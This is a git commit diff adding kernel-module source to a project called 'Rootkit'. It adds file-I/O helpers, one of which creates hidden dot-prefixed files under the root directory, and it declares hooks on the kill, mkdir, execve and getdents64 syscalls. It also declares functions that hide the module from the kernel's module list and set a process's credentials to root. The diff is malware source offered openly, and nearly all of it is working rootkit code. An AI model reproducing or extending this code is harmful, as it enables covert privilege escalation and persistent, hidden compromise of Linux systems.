12ea219c69905cf94b37a779ed2df2da74869e3e
LordOfTheIoT <lord_of_the_iot@proton.me>
2023-08-23 10:11:51 +0100

    renamed custom/ to includes/

---
+++ Rootkit/src/includes/files.c
@@ -0,0 +1,78 @@
+/*======================================================*\
+  functions and structs to interact with kernel file I/O
+\*======================================================*/
+
+#include <linux/fs.h>
+#include <asm/uaccess.h>
+
+extern char ROOTKIT_ID[];
+struct kern_file{ //file holding data for file reading/writing
+	struct file *fp; //pointer of file
+	loff_t pos; //position to write to
+	size_t count; //count of the size of the file?
+  ssize_t ret; //just a placeholder for when a number is returned
+};
+
+static struct kern_file *open_file(char *path, int flags);
+static struct kern_file *open_hidden_file(char *filename);
+static int file_close(struct kern_file *file);
+static int file_read(struct kern_file *file, void *buf);
+static int file_write(struct kern_file *file, void *buf, int buf_size);
+
+
+
+static struct kern_file *open_file(char *path, int flags){
+	//code from https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
+	struct kern_file *file=kzalloc(sizeof(struct kern_file), GFP_KERNEL); //file descriptor
+  int err = 0; //error code
+
+  file->fp = filp_open(path, flags, 0666); //opens the file in append mode //UPDATE change permissions from 666
+  if (IS_ERR(file->fp)) { //if file doesnt exist
+		err = PTR_ERR(file->fp);
+		printk("[rootkit][files.c::open_file] ERROR    unable to open file: error code %i\n", err); //DEBUG
+		return (struct kern_file*) NULL;
+  }
+  return file;
+}
+
+static struct kern_file *open_hidden_file(char *filename){ //opens file in / prepended with ROOTKIT_ID or creates if doesn't exist
+	struct kern_file *hidden_file;
+	char *path;
+	path = kzalloc(BUFFER_SIZE, GFP_KERNEL);
+	sprintf(path, "/.%s%s", ROOTKIT_ID, filename);
+	printk("[rootkit][files.c::open_hidden_file] DEBUG    path = %s\n", path); //DEBUG
+	hidden_file = open_file(path, O_APPEND | O_RDWR); //opens file in append mode
+	if (hidden_file==NULL){ //if file doesn't exist
+		printk("[rootkit][files.c::open_hidden_file] DEBUG    file doesn't exist\n"); //DEBUG
+		hidden_file = open_file(path, O_CREAT | O_RDWR); //creates file
+	}
+	if (hidden_file==NULL){ //if file doesn't exist
+		printk("[rootkit][files.c::open_hidden_file] ERROR    unable to open/create file\n"); //DEBUG
+	}
+    return hidden_file; //return file
+}
+
+static int file_close(struct kern_file *file){
+	filp_close(file->fp, NULL);
+	kfree(file);
+	return 0;
+}
+
+static int file_read(struct kern_file *file, void *buf){
+	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
+	file->pos = 0;
+	kernel_read(file->fp, buf, file->count, &(file->pos));
+	return (int) file->count - (int) file->pos; //returns how many bytes not read
+}
+
+static int file_write(struct kern_file *file, void *buf, int buf_size){
+	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
+	file->pos = 0; //CHECK could be writing to start, but is in append mode so need to check
+	file->ret = kernel_write(file->fp, buf, buf_size*8, &(file->pos)); //writes data to file
+	if (file->ret!=buf_size*8){ //not all bytes writtens
+		printk("[rootkit][files.c::file_write] ERROR    unable to write %i bytes to file: file->ret=%i   buf_size=%i\n", buf_size*8-file->ret, file->ret, buf_size);  //DEBUG
+		return buf_size*8-file->ret; //returns number of bytes not written
+	}
+	return 0;
+
+}
---
+++ Rootkit/src/includes/hooked_syscalls.h
@@ -0,0 +1,26 @@
+/*=====================================================================*\
+  function declerations and global variables for hooked_syscalls.c file
+\*=====================================================================*/
+
+
+#include <linux/dirent.h>
+
+extern int BUFFER_SIZE;
+
+bool module_hidden = false;
+static struct list_head *prev_module; //location of the previous module
+
+static int hide_rootkit(void); //function to unhide\hide the rootkit
+static int set_root(void); //changes credentials of process to root
+
+//hook functions
+static asmlinkage long hooked_kill(const struct pt_regs *regs);
+static asmlinkage long hooked_mkdir(const struct pt_regs *regs);
+static asmlinkage long hooked_execve(const struct pt_regs *regs);
+static asmlinkage long hooked_getdents64(const struct pt_regs *regs);
+
+//the hook_t structs for use within module
+struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill};
+struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir};
+struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve};
+struct hook_t sys_getdents64 = {.hooked_syscall = hooked_getdents64, .syscall_number = __NR_getdents64};
